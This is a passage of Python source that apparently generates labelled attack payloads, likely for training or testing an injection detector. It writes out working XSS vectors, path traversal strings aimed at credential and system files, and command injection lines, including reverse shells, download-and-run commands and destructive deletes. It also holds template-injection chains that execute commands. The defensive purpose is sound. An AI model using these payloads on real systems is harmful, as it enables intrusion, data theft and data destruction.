        elif kind == 2:
            s = f"{decl}<!DOCTYPE {root} PUBLIC \"-//{rand_ident(rng, 2, 5).upper()}//EN\" \"{tgt}\"><{root}/>"
        elif kind == 3:
            s = f"<{root} xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"{tgt}\"/></{root}>"
        else:
            s = f"{decl}<!DOCTYPE {root} [<!ENTITY {ent} \"{rand_ident(rng, 2, 4)}\"><!ENTITY {ent}2 \"&{ent};&{ent};&{ent};&{ent};\">]><{root}>&{ent}2;</{root}>"
        prefix = ""
    elif flavor == "svg_anim":
        s = rng.choice((
            f"<svg><{kw(rng, 'animate')}{sep}onbegin={js}{sep}attributeName=x{sep}dur=1s>",
            f"<svg><{kw(rng, 'set')}{sep}attributeName=onmouseover{sep}to={js}>",
            f"<svg><a><{kw(rng, 'animate')} attributeName=href values=javascript:{js} /><text x=20 y=20>{rand_word(rng)}</text></a>",
            f"<svg><script>{js}</script></svg>",
            f"<svg/onload={js}>",
            f"<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='{js}' /></svg>#x\" />",
        ))
    elif flavor == "meta":
        s = rng.choice((
            f"<{kw(rng, 'meta')}{sep}http-equiv=refresh{sep}content=\"0;url=javascript:{js}\">",
            f"<{kw(rng, 'meta')}{sep}http-equiv=\"refresh\"{sep}content=\"0;url={rand_url(rng)}\">",
            f"<{kw(rng, 'meta')}{sep}http-equiv=\"Set-Cookie\"{sep}content=\"{rand_ident(rng, 2, 6)}={rand_hex(rng, 8)}\">",
        ))
    elif flavor == "css":
        s = rng.choice((
            f"<{kw(rng, 'style')}>@import '{rand_url(rng)}.css';</{kw(rng, 'style')}>",
            f"<{kw(rng, 'style')}>*{{background:url(javascript:{js})}}</{kw(rng, 'style')}>",
            f"<div style=\"width:expression({js})\">",
            f"<div{sep}style=\"background-image:url(javascript:{js})\">",
            f"<{kw(rng, 'link')}{sep}rel=stylesheet{sep}href={_quote_attr(rng, rand_url(rng))}>",
            f"<{kw(rng, 'style')}>@keyframes x{{}}</{kw(rng, 'style')}><div style=\"animation-name:x\" onanimationstart=\"{js}\"></div>",
        ))
    elif flavor == "form":
        s = rng.choice((
            f"<{kw(rng, 'form')}{sep}action={_quote_attr(rng, rand_url(rng))}{sep}method=post><input name=password type=password><input type=submit></form>",
            f"<{kw(rng, 'button')}{sep}formaction=javascript:{js}>{rand_word(rng)}</button>",
            f"<{kw(rng, 'input')}{sep}type=submit{sep}formaction=javascript:{js}>",
            f"<{kw(rng, 'isindex')}{sep}action=javascript:{js}{sep}type=image>",
        ))
    elif flavor == "base":
        s = f"<{kw(rng, 'base')}{sep}href={_quote_attr(rng, rand_url(rng))}>"
    elif flavor == "object":
        s = rng.choice((
            f"<{kw(rng, 'object')}{sep}data={_quote_attr(rng, 'javascript:' + js)}>",
            f"<{kw(rng, 'embed')}{sep}src={_quote_attr(rng, rand_url(rng) + '.swf')}{sep}allowscriptaccess=always>",
            f"<{kw(rng, 'applet')}{sep}code={rand_ident(rng, 3, 6)}.class{sep}codebase={_quote_attr(rng, rand_url(rng))}>",
        ))
    elif flavor == "math":
        s = f"<math><maction actiontype=statusline#{rand_url(rng)} xlink:href=javascript:{js}>{rand_word(rng)}"
    elif flavor == "template_tag":
        s = rng.choice((
            f"<noscript><p title=\"</noscript><img src=x onerror={js}>\">",
            f"<template><img src=x onerror={js}></template>",
            f"<xmp><img src=x onerror={js}></xmp>",
            f"<!--<img src=\"--><img src=x onerror={js}//\">",
            f"<![CDATA[<script>{js}</script>]]>",
        ))
    else:  # polyglot
        s = rng.choice((
            f"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk={js} )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd={js}//>\\x3e",
            f"'\"--></style></script><script>{js}</script>",
            f"\"'><img src=x onerror={js}><\"'",
        ))
        prefix = ""
    s = prefix + s
    mask = M_MARKUP
    if _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


# --------------------------------------------------------------------------
# Path traversal
# --------------------------------------------------------------------------

# (unit, needs obfuscation bit)
_TRAVERSAL_UNITS: Tuple[Tuple[str, int, bool], ...] = (
    ("../", 20, False), ("..\\", 6, False), ("..%2f", 5, False), ("..%2F", 2, False),
    ("%2e%2e/", 4, False), ("%2e%2e%2f", 5, False), ("%2E%2E%2F", 2, False),
    ("%2e%2e\\", 1, False), ("%2e%2e%5c", 2, False), ("..%5c", 3, False), ("..%5C", 1, False),
    ("....//", 3, False), ("....\\/", 1, False), ("..././", 2, False), ("...\\.\\", 1, False),
    ("....////", 1, False), ("..//", 2, False), ("..\\/", 1, False), ("..;/", 2, False),
    (".%2e/", 2, False), ("%2e./", 1, False), ("./../", 1, False), ("/..", 0, False),
    ("..%252f", 2, True), ("%252e%252e%252f", 2, True), ("..%255c", 1, True),
    ("..%c0%af", 2, True), ("%c0%ae%c0%ae/", 2, True), ("..%c1%9c", 1, True),
    ("%c0%2e%c0%2e%c0%af", 1, True), ("..%e0%80%af", 1, True),
    ("%u002e%u002e%u2215", 1, True), ("..%u2216", 1, True), ("%uff0e%uff0e/", 1, True),
    ("..\u2215", 0, True), ("\uff0e\uff0e/", 1, True), ("..%%32%66", 1, True),
)

_PATH_PREFIXES = (
    ("", 14), ("/", 4), ("./", 2), ("images/", 1), ("static/", 1), ("uploads/", 1),
    ("assets/img/", 1), ("/var/www/html/", 1), ("/var/www/", 1), ("templates/", 1),
    ("C:\\inetpub\\wwwroot\\", 1), ("/app/public/", 1), ("files/", 1), ("/srv/data/", 1),
)


def _traversal_target(rng: random.Random, windows: bool, known: bool = False) -> str:
    if windows:
        if known or rng.random() < 0.8:
            return rng.choice(WINDOWS_FILES)
        return rand_sensitive_file(rng).replace("/", "\\")
    return rand_sensitive_file(rng, known)


def gen_path(rng: random.Random) -> Payload:
    mask = M_PATH
    style = pick(rng, (("units", 14), ("mixed", 3), ("absolute", 2), ("fileurl", 2),
                       ("wrapper", 2), ("unc", 1), ("drive", 1), ("prefixed_abs", 2), ("nested", 1)))
    units = [u for u, _, _ in _TRAVERSAL_UNITS]
    weights = [w for _, w, _ in _TRAVERSAL_UNITS]
    obf_units = {u for u, _, o in _TRAVERSAL_UNITS if o}
    depth = rng.choice((1, 2, 2, 3, 3, 4, 4, 5, 6, 7, 8, 10, 12))
    if style == "units":
        unit = rng.choices(units, weights)[0]
        windows = "\\" in unit or "%5c" in unit.lower() or "%255c" in unit.lower()
        target = _traversal_target(rng, windows and rng.random() < 0.7, depth <= 2)
        if "%2f" in unit.lower() and rng.random() < 0.5:
            target = target.replace("/", rng.choice(("%2f", "%2F")))
        s = pick(rng, _PATH_PREFIXES) + unit * depth + target
        if unit in obf_units:
            mask |= M_OBFUSCATION
    elif style == "mixed":
        chosen = rng.choices(units, weights, k=depth)
        s = "".join(chosen) + _traversal_target(rng, False, depth <= 2)
        if any(u in obf_units for u in chosen):
            mask |= M_OBFUSCATION
    elif style == "absolute":
        target = _traversal_target(rng, False, True)
        s = rng.choice(("/", "//", "/./", "\\")) + target
    elif style == "fileurl":
        s = rng.choice(("file://", "file:///", "file://localhost/", "FILE:///", "file:")) + _traversal_target(rng, False, True)
        if rng.random() < 0.2:
            s = "file:///c:/" + rng.choice(WINDOWS_FILES).replace("\\", "/")
    elif style == "wrapper":
        resource = rng.choice(("/", "../" * rng.randint(1, 5), "")) + _traversal_target(rng, False)
        s = rng.choice((
            f"php://filter/convert.base64-encode/resource={resource}",
            f"php://filter/read=string.rot13/resource={resource}",
            f"php://filter/resource={resource}",
            f"zip://{rand_ident(rng, 3, 8)}.zip#{rand_ident(rng, 2, 6)}.php",
            f"phar://{rand_ident(rng, 3, 8)}.phar/{rand_ident(rng, 2, 6)}.txt",
            f"jar:file:///{rand_ident(rng, 3, 6)}.jar!/{resource.lstrip('/')}",
            f"compress.zlib://{resource}",
        ))
    elif style == "unc":
        s = rng.choice(("\\\\", "//")) + rand_host(rng) + rng.choice(("\\", "/")) + rng.choice(("c$", "admin$", "ipc$", "d$")) + rng.choice(("\\", "/")) + rand_ident(rng, 2, 8)
        if rng.random() < 0.5:
            s = "\\\\?\\" + rng.choice(("C:\\", "UNC\\")) + rng.choice(WINDOWS_FILES)
    elif style == "drive":
        s = rng.choice(("C:\\", "c:\\", "C:/", "D:\\", "c:/")) + ("..\\" * rng.randint(0, 3)) + rng.choice(WINDOWS_FILES)
    elif style == "prefixed_abs":
        base = rng.choice(("/var/www/html/", "/var/www/images/", "/usr/share/nginx/html/", "/app/static/", "/opt/app/uploads/"))
        s = base + "../" * depth + _traversal_target(rng, False, depth <= 2)
    else:  # nested: traversal inside a parameter value of an internal URL
        inner = "../" * depth + _traversal_target(rng, False, depth <= 2)
        s = rng.choice(("/download?file=", "/view?page=", "/static?path=", "/include?template=", "/read?doc=")) + inner
    suffix = pick(rng, (("", 20), ("%00", 2), ("%00.png", 1), ("%00.jpg", 1), ("%00.html", 1), ("?", 1),
                        ("#", 1), (";.png", 1), ("%3f", 1), ("/.", 1), (".", 1), ("%20", 1), ("::$DATA", 1)))
    s += suffix
    if _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


# --------------------------------------------------------------------------
# Command injection
# --------------------------------------------------------------------------

def _posix_command(rng: random.Random) -> str:
    host = rand_host(rng)
    f = "/" + rand_sensitive_file(rng)
    url = rand_url(rng)
    return pick(rng, (
        ("id", 4), ("whoami", 4), (f"uname{rng.choice(('', ' -a', ' -r', ' -m'))}", 3), (f"cat {f}", 6),
        (f"ls{rng.choice(('', ' -la', ' -l', ' -al'))} {rng.choice(('/', '/tmp', '/home', '~', '.', '/var/www'))}", 3),
        ("hostname", 2), ("pwd", 1), ("env", 2), ("printenv", 1), ("set", 1), ("ps aux", 2), ("ps -ef", 1),
        ("ifconfig", 1), ("ip a", 1), ("netstat -an", 1), ("ss -tlnp", 1), ("w", 0), ("last", 1),
        (f"curl {rng.choice(('', '-s ', '-sk ', '-fsSL '))}{url}", 4),
        (f"curl {url} | {rng.choice(('sh', 'bash'))}", 3),
        (f"curl -d @{f} {url}", 1), (f"curl -F f=@{f} {url}", 1),
        (f"wget {rng.choice(('', '-q ', '-qO- ', '-O /tmp/' + rand_ident(rng, 1, 4) + ' '))}{url}", 3),
        (f"wget -O- {url} | sh", 1),
        (f"ping -c {rng.randint(1, 20)} {host}", 3), (f"nslookup {rand_ident(rng, 3, 8)}.{host}", 2),
        (f"dig {rand_ident(rng, 3, 8)}.{host}", 1), (f"sleep {rng.randint(2, 30)}", 3),
        (f"echo {rand_ident(rng, 3, 10)}", 2), (f"echo {rand_hex(rng, 8)} > /tmp/{rand_ident(rng, 1, 6)}", 1),
        (f"rm -rf {rng.choice(('/', '/tmp/*', '/var/www', '~', '*'))}", 2), (f"chmod +x /tmp/{rand_ident(rng, 1, 6)}", 1),
        (f"touch /tmp/{rand_ident(rng, 1, 8)}", 1), (f"mkfifo /tmp/{rand_ident(rng, 1, 4)}", 1),
        (f"nc {host} {rand_port(rng)}", 2), (f"nc -e /bin/sh {host} {rand_port(rng)}", 2),
        (f"ncat {host} {rand_port(rng)} -e /bin/bash", 1), (f"telnet {host} {rand_port(rng)}", 1),
        (f"bash -c '{rng.choice(('id', 'whoami', 'cat ' + f))}'", 2), (f"sh -c {rng.choice(('id', 'whoami'))}", 1),
        (f"python{rng.choice(('', '3'))} -c 'import os;os.system(\"{rng.choice(('id', 'whoami', 'ls'))}\")'", 2),
        (f"perl -e 'system(\"{rng.choice(('id', 'whoami'))}\")'", 1), (f"php -r 'system(\"{rng.choice(('id', 'whoami'))}\");'", 1),
        (f"ruby -e '`{rng.choice(('id', 'whoami'))}`'", 1), (f"busybox {rng.choice(('id', 'wget ' + url, 'nc ' + host + ' 4444'))}", 1),
        (f"echo {base64.b64encode(rng.choice((b'id', b'whoami', b'cat /etc/passwd', b'uname -a'))).decode()} | base64 -d | sh", 2),
        (f"tftp -i {host} GET {rand_ident(rng, 2, 6)}", 1), (f"cp {f} /tmp/{rand_ident(rng, 1, 5)}", 1),
        (f"tail {rng.choice(('-n 50 ', '-f ', ''))}{f}", 1), (f"head {f}", 1), (f"xxd {f}", 1),
        (f"find / -name {rng.choice(('*.conf', 'id_rsa', '*.pem', 'config.php'))}", 1),
        (f"crontab -l", 1), ("sudo -l", 1), ("cat /proc/version", 1), (f"kill -9 {rng.randint(1, 9999)}", 1),
        (f"awk 'BEGIN {{system(\"{rng.choice(('id', 'whoami'))}\")}}'", 1),
    ))


_WIN_DIRS = ("C:\\", "c:\\", "%USERPROFILE%", "C:\\Users", "C:\\inetpub\\wwwroot")
_WIN_FILES_ABS = ("C:\\Windows\\win.ini", "C:\\boot.ini", "c:\\inetpub\\wwwroot\\web.config", "%WINDIR%\\system.ini")


def _windows_command(rng: random.Random) -> str:
    host = rand_host(rng)
    url = rand_url(rng)
    b64 = base64.b64encode(rng.choice(("whoami", "iwr " + url, "Get-Process", "ipconfig")).encode("utf-16-le")).decode()
    return pick(rng, (
        ("dir", 2), ("dir " + rng.choice(_WIN_DIRS), 2),
        ("type " + rng.choice(_WIN_FILES_ABS), 3),
        ("whoami", 3), ("whoami /all", 1), ("whoami /priv", 1), ("net user", 2), (f"net user {rand_ident(rng, 3, 8)} {rand_ident(rng, 6, 10)} /add", 1),
        ("net localgroup administrators", 1), ("ipconfig /all", 2), ("systeminfo", 2), ("tasklist", 2), ("ver", 1),
        (f"ping -n {rng.randint(1, 20)} {host}", 2), (f"nslookup {host}", 1), (f"timeout /t {rng.randint(2, 30)}", 1),
        (f"powershell -nop -c \"iwr {url}\"", 2), (f"powershell -enc {b64}", 2),
        (f"powershell -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('{url}')\"", 2),
        (f"cmd /c {rng.choice(('whoami', 'dir', 'set', 'ver'))}", 2), (f"cmd.exe /c {rng.choice(('whoami', 'net user'))}", 1),
        (f"certutil -urlcache -split -f {url} {rand_ident(rng, 1, 6)}.exe", 2),
        (f"bitsadmin /transfer {rand_ident(rng, 1, 6)} {url} %TEMP%\\{rand_ident(rng, 1, 6)}.exe", 1),
        (f"mshta {url}.hta", 1), (f"rundll32 {rand_ident(rng, 2, 6)}.dll,{rand_ident(rng, 3, 8)}", 1),
        (f"regsvr32 /s /n /u /i:{url}.sct scrobj.dll", 1), (f"wmic process call create \"{rng.choice(('calc', 'cmd', 'notepad'))}\"", 1),
        ("reg query HKLM\\" + rng.choice(("SAM", "SOFTWARE\\Microsoft", "SYSTEM")), 1), ("set", 1), ("echo %USERNAME%", 1),
        ("del /f /q " + rng.choice(("C:\\*", "%TEMP%\\*", "c:\\inetpub\\wwwroot\\*")), 1),
    ))


def _cmd_value(rng: random.Random) -> str:
    """The ordinary value that an injection follows."""
    return pick(rng, (
        ("", 10), ("127.0.0.1", 3), ("localhost", 1), (benign.ipv4(rng), 2), (rand_host(rng), 2),
        (benign.filename(rng), 2), (rand_word(rng), 3), (str(rng.randint(1, 9999)), 2),
        (benign.email(rng), 1), ("8.8.8.8", 1), ("file.txt", 1), (f"{rand_word(rng)}.{rng.choice(('jpg', 'pdf', 'png', 'txt'))}", 1),
    ))


def _ifs_spaces(rng: random.Random, cmd: str) -> Tuple[str, bool]:
    """Replace the spaces of `cmd` with a shell substitute. Returns (cmd, obfuscated)."""
    if " " not in cmd:
        return cmd, False
    style = pick(rng, (("${IFS}", 4), ("$IFS$9", 2), ("${IFS%??}", 1), ("%09", 2), ("\t", 2), ("<", 1), ("brace", 2)))
    if style == "brace":
        parts = cmd.split(" ")
        if any(c in "".join(parts) for c in "{},'\"|;&$`"):
            return cmd.replace(" ", "${IFS}"), False
        return "{" + ",".join(parts) + "}", False
    if style == "<":
        head, _, tail = cmd.partition(" ")
        if tail.startswith("/") and " " not in tail:
            return f"{head}<{tail}", False
        return cmd.replace(" ", "${IFS}"), False
    return cmd.replace(" ", style), False


def _glob_command(rng: random.Random) -> Tuple[str, bool]:
    """A command spelled with shell globs or quotes, which hides its keywords."""
    return rng.choice((
        ("/???/c?t /???/p?ss??", True), ("/???/??t /???/??ss??", True), ("/b??/w?o?mi", True),
        ("/???/b??/i?", True), ("c''at /e''tc/pa''sswd", True), ("w\"h\"o\"a\"m\"i", True),
        ("wh\\oami", True), ("c\\at /e\\tc/pa\\sswd", True), ("$(printf '\\x69\\x64')", True),
        ("$(echo d2hvYW1p|base64 -d)", True), ("`echo$IFS\"aWQ=\"|base64$IFS-d`", True),
        ("/bin/ca[t] /et[c]/passw[d]", True), ("c$@at /etc/passwd", True), ("who$()ami", True),
        ("i${x}d", True), ("$'\\151\\144'", True), ("rev<<<'imaohw'|sh", True),
    ))


def gen_cmd(rng: random.Random) -> Payload:
    mask = M_CMD
    windows = rng.random() < 0.22
    cmd = _windows_command(rng) if windows else _posix_command(rng)
    if not windows:
        r = rng.random()
        if r < 0.12:
            cmd, _ = _ifs_spaces(rng, cmd)
        elif r < 0.2:
            cmd, obf = _glob_command(rng)
            if obf:
                mask |= M_OBFUSCATION
    if windows:
        flavor = pick(rng, (("amp", 5), ("andand", 3), ("pipe", 3), ("oror", 1), ("newline", 1), ("caret", 1)))
    else:
        flavor = pick(rng, (("semi", 8), ("pipe", 4), ("andand", 4), ("oror", 2), ("amp", 2), ("backtick", 4),
                            ("subshell", 5), ("newline", 3), ("quote_break", 3), ("procsub", 1), ("brace_group", 1)))
    sp = lambda: rng.choice(("", " ", " ", "  "))  # noqa: E731
    if flavor == "semi":
        s = f"{sp()};{sp()}{cmd}"
    elif flavor == "pipe":
        s = f"{sp()}|{sp()}{cmd}"
    elif flavor == "andand":
        s = f"{sp()}&&{sp()}{cmd}"
    elif flavor == "oror":
        s = f"{sp()}||{sp()}{cmd}"
    elif flavor == "amp":
        s = f"{sp()}&{sp()}{cmd}"
    elif flavor == "backtick":
        s = f"`{cmd}`"
    elif flavor == "subshell":
        s = f"$({cmd})"
    elif flavor == "newline":
        nl = rng.choice(("\n", "%0a", "%0A", "\r\n", "%0d%0a"))
        s = f"{nl}{cmd}" + rng.choice(("", nl))
    elif flavor == "quote_break":
        q = rng.choice(("'", '"'))
        s = rng.choice((f"{q};{cmd};{q}", f"{q} && {cmd} && {q}", f"{q}|{cmd}|{q}", f"{q}$({cmd}){q}",
                        f"{q}`{cmd}`{q}", f"{q}; {cmd} #"))
    elif flavor == "procsub":
        s = f"<({cmd})" if rng.random() < 0.5 else f">({cmd})"
    elif flavor == "brace_group":
        s = f";{{ {cmd}; }}"
    else:  # caret: Windows caret-escaped keyword
        s = "&" + "".join(c + "^" if c.isalpha() and rng.random() < 0.3 else c for c in cmd)
        mask |= M_OBFUSCATION
    if flavor in ("semi", "pipe", "andand", "oror", "amp", "newline") and rng.random() < 0.3:
        s += rng.choice((" #", ";", " &", "#", " ;", "|", " //"))
    if rng.random() < 0.15 and not windows:
        # Reverse shells and chains of several commands replace the payload.
        mask = M_CMD
        host = rand_host(rng)
        port = rand_port(rng)
        s = rng.choice((
            f"; bash -i >& /dev/tcp/{host}/{port} 0>&1",
            f"| nc -e /bin/sh {host} {port}",
            f"$(nc {host} {port} -e /bin/bash)",
            f"; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f",
            f"; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{host}\",{port}));os.dup2(s.fileno(),0)'",
            f"; php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            f"; socat tcp-connect:{host}:{port} exec:sh",
            f"; {_posix_command(rng)}; {_posix_command(rng)}",
            f"&& {_posix_command(rng)} && {_posix_command(rng)}",
        ))
    s = _cmd_value(rng) + s
    if _has_double_escape(s):
        mask |= M_OBFUSCATION
    return s.encode("utf-8"), mask


# --------------------------------------------------------------------------
# Template and expression-language injection
# --------------------------------------------------------------------------

_TEMPLATE_DELIMS = (
    ("{{", "}}", 10), ("${", "}", 8), ("#{", "}", 4), ("<%=", "%>", 4), ("{%", "%}", 2), ("*{", "}", 2),
    ("@(", ")", 1), ("[[${", "}]]", 1), ("{{=", "}}", 1), ("{=", "}", 1), ("${{", "}}", 2), ("<#=", "#>", 1),
    ("{", "}", 1), ("$", "", 0), ("[=", "]", 1), ("@{", "}", 1), ("{{{", "}}}", 1), ("<%", "%>", 1),
    ("[[", "]]", 1), ("${{<%[%'\"}}%\\.", "", 0),
)


def _template_probe(rng: random.Random) -> str:
    a = rng.randint(2, 99)
    b = rng.randint(2, 99)
    op = rng.choice(("*", "*", "*", "+", "-"))
    expr = pick(rng, ((f"{a}{op}{b}", 8), (f"{a}{op}'{b}'", 2), (f"'{a}'{op}{b}", 1), (f" {a} {op} {b} ", 2),
                      (f"{a}{op}{b}{op}{rng.randint(2, 9)}", 1), (f"({a}{op}{b})", 1)))
    choices = [(d, w) for d in _TEMPLATE_DELIMS for w in (d[2],) if w]
    opener, closer, _ = pick(rng, choices)
    if opener == "{%":
        return rng.choice((f"{{%print({expr})%}}", f"{{% print {expr} %}}", f"{{% set x={expr} %}}{{{{x}}}}"))
    if opener == "<%":
        return rng.choice((f"<% out.print({expr}) %>", f"<%={expr}%>", f"<% print({expr}) %>"))
    return f"{opener}{expr}{closer}"


_PY_BASES = ("''", '""', "()", "[]", "{}", "request", "config", "self", "lipsum", "cycler", "joiner",
             "namespace", "url_for", "get_flashed_messages", "range", "dict", "g", "session")


def _py_chain(rng: random.Random, cmd: str) -> str:
    base = rng.choice(_PY_BASES)
    gl = rng.choice(("__init__.__globals__", "__globals__"))
    return pick(rng, (
        (f"{base}.__class__.__mro__[{rng.randint(1, 2)}].__subclasses__()", 3),
        (f"{base}.__class__.__base__.__subclasses__()[{rng.randint(40, 500)}]", 2),
        (f"{base}.__class__.__mro__[1].__subclasses__()[{rng.randint(40, 500)}]('{cmd}',shell=True,stdout=-1).communicate()", 2),
        (f"{rng.choice(('cycler', 'joiner', 'lipsum', 'namespace', 'url_for'))}.{gl}.os.popen('{cmd}').read()", 4),
        (f"{rng.choice(('lipsum', 'url_for', 'get_flashed_messages', 'self._TemplateReference__context.cycler'))}.__globals__['os'].popen('{cmd}').read()", 3),
        (f"request.application.__globals__.__builtins__.__import__('os').popen('{cmd}').read()", 2),
        (f"config.__class__.__init__.__globals__['os'].popen('{cmd}').read()", 2),
        (f"self.__init__.__globals__.__builtins__.__import__('os').system('{cmd}')", 1),
        (f"{base}|attr('__class__')|attr('__mro__')", 1),
        (f"request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')", 1),
        (f"config.items()", 1), (f"config", 1), (f"settings.SECRET_KEY", 1), (f"self.__dict__", 1),
        (f"get_flashed_messages.__globals__.current_app.config", 1),
    ))


_JAVA_EXECS = (
    "T(java.lang.Runtime).getRuntime().exec('{c}')",
    "T(java.lang.System).getenv()",
    "T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream())",
    "new java.lang.ProcessBuilder('{c}').start()",
    "''.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('{c}')",
    "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('{c}').getInputStream()).next()",
    "T(java.lang.Thread).sleep({n})",
    "''.class.forName('java.lang.Runtime')",
    "Runtime.getRuntime().exec('{c}')",
)


def gen_template(rng: random.Random) -> Payload:
    mask = M_TEMPLATE
    cmd = rng.choice(("id", "whoami", "ls", "uname -a", "cat /etc/passwd", "hostname", "env", "ls /",
                      "curl " + rand_url(rng), "ping -c 1 " + rand_host(rng), "sleep " + str(rng.randint(2, 20))))
    n = rng.randint(1000, 9000)
    java = rng.choice(_JAVA_EXECS).format(c=cmd, n=n)
    flavor = pick(rng, (
        ("probe", 9), ("jinja", 6), ("twig", 2), ("freemarker", 2), ("velocity", 2), ("spel", 3),
        ("ognl", 2), ("thymeleaf", 2), ("erb", 2), ("el", 2), ("smarty", 2), ("mako", 1), ("tornado", 1),
        ("django", 1), ("handlebars", 1), ("pebble", 1), ("csti", 2), ("go", 1), ("razor", 1), ("jndi", 6),
        ("lookup", 1), ("nunjucks", 1), ("mvel", 1), ("slim", 1), ("liquid", 1),
    ))
    if flavor == "probe":
        s = _template_probe(rng)
    elif flavor == "jinja":
        chain = _py_chain(rng, cmd)
        s = rng.choice((f"{{{{{chain}}}}}", f"{{{{ {chain} }}}}", f"{{%print({chain})%}}",
                        f"{{% set x={chain} %}}{{{{x}}}}", f"{{{{{chain}|safe}}}}"))
    elif flavor == "twig":
        s = rng.choice((
            f"{{{{_self.env.registerUndefinedFilterCallback(\"{rng.choice(('exec', 'system', 'passthru'))}\")}}}}{{{{_self.env.getFilter(\"{cmd}\")}}}}",
            f"{{{{['{cmd}']|filter('system')}}}}", f"{{{{['{cmd}']|map('system')|join}}}}",
            f"{{{{['{cmd}',1]|sort('system')|join}}}}", f"{{{{app.request.server.all|join(',')}}}}",
            f"{{{{'/etc/passwd'|file_excerpt(1,30)}}}}", f"{{{{dump(app)}}}}", f"{{{{_self}}}}",
        ))
    elif flavor == "freemarker":
        s = rng.choice((
            f'<#assign ex="freemarker.template.utility.Execute"?new()>${{ex("{cmd}")}}',
            f'${{"freemarker.template.utility.Execute"?new()("{cmd}")}}',
            f'<#assign {rand_ident(rng, 1, 5)}="freemarker.template.utility.ObjectConstructor"?new()>',
            f'${{product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve("/etc/passwd").toURL().openStream()}}',
            f'<#assign value="{rand_ident(rng, 2, 6)}">${{value?api.class}}',
            f'${{.data_model}}',
        ))
    elif flavor == "velocity":
        v = rand_ident(rng, 1, 4)
        s = rng.choice((
            f'#set(${v}="{rng.choice(_LOWER)}");${v}.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("{cmd}")',
            f"#set(${v}={rng.randint(1, 9)}+{rng.randint(1, 9)})${v}",
            f'$class.inspect("java.lang.Runtime").type.getRuntime().exec("{cmd}")',
            f'#set($rt=$x.class.forName("java.lang.Runtime"))#set($p=$rt.getRuntime().exec("{cmd}"))',
            f"#foreach($i in [1..{rng.randint(2, 9)}])$i#end",
        ))
    elif flavor == "spel":
        s = rng.choice((java, f"${{{java}}}", f"#{{{java}}}", f"*{{{java}}}", f"__${{{java}}}__::.x"))
    elif flavor == "ognl":
        s = rng.choice((
            f"%{{(#a=@java.lang.Runtime@getRuntime().exec('{cmd}'))}}",
            f"@java.lang.Runtime@getRuntime().exec('{cmd}')",
            "(#context['xwork.MethodAccessor.denyMethodExecution']=false)",
            f"%{{#_memberAccess['allowStaticMethodAccess']=true,@java.lang.Runtime@getRuntime().exec('{cmd}')}}",
            f"${{(#_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(@java.lang.Runtime@getRuntime().exec('{cmd}'))}}",
            f"%{{{rng.randint(2, 99)}*{rng.randint(2, 99)}}}",
        ))
    elif flavor == "thymeleaf":
        s = rng.choice((f"__${{{java}}}__::.x", f"[[${{{java}}}]]", f"[({java})]", f"__${{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"{cmd}\").getInputStream()).next()}}__::.x",
                        f"*{{T(java.lang.Runtime).getRuntime().exec('{cmd}')}}"))
    elif flavor == "erb":
        s = rng.choice((
            f"<%= system('{cmd}') %>", f"<%= `{cmd}` %>", f"<%= IO.popen('{cmd}').read %>",
            f"<%= File.read('/{rand_sensitive_file(rng)}') %>", f"<%= Dir.entries('/') %>",
            f"<%= %x({cmd}) %>", f"<%= eval('{cmd}') %>", f"<%= Kernel.exec('{cmd}') %>",
            f"<%= {rng.randint(2, 99)}*{rng.randint(2, 99)} %>",
        ))
    elif flavor == "el":
        s = rng.choice((
            "${pageContext.request.getServerInfo()}", "${applicationScope}", "#{session}",
            "${''.getClass().forName('java.lang.Runtime')}", "${sessionScope}", "${header}",
            "${initParam}", "#{facesContext.externalContext}", f"${{param.{rand_ident(rng, 1, 5)}}}",
            "${pageContext.servletContext.getRealPath('/')}", f"${{{java}}}",
            "#{request.getClass().getClassLoader()}",
        ))
    elif flavor == "smarty":
        s = rng.choice((
            f"{{system('{cmd}')}}", f"{{php}}echo `{cmd}`;{{/php}}", "{$smarty.version}",
            f"{{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"<?php passthru($_GET['cmd']); ?>\",self::clearConfig())}}",
            f"{{if system('{cmd}')}}{{/if}}", f"{{$smarty.template_object->smarty->disableSecurity()->display('string:{{system(\"{cmd}\")}}')}}",
            "{self::getStreamVariable(\"file:///etc/passwd\")}", f"{{math equation=\"{rng.randint(2, 9)}*{rng.randint(2, 9)}\"}}",
        ))
    elif flavor == "mako":
        s = rng.choice((
            f"${{self.module.cache.util.os.system('{cmd}')}}",
            f"<% import os; x=os.popen('{cmd}').read() %>${{x}}",
            f"${{__import__('os').popen('{cmd}').read()}}",
            f"<%import os%>${{os.system('{cmd}')}}",
        ))
    elif flavor == "tornado":
        s = rng.choice((f"{{% import os %}}{{{{os.popen('{cmd}').read()}}}}", f"{{% raw __import__('os').popen('{cmd}').read() %}}",
                        f"{{{{handler.settings}}}}", f"{{% import subprocess %}}{{{{subprocess.check_output('{cmd}',shell=True)}}}}"))
    elif flavor == "django":
        s = rng.choice(("{% debug %}", "{{settings.SECRET_KEY}}", "{% load log %}{% get_admin_log 10 as log %}",
                        "{{request.environ}}", "{% include 'admin/base.html' %}", "{{messages.storages.0.signer.key}}"))
    elif flavor == "handlebars":
        s = rng.choice((
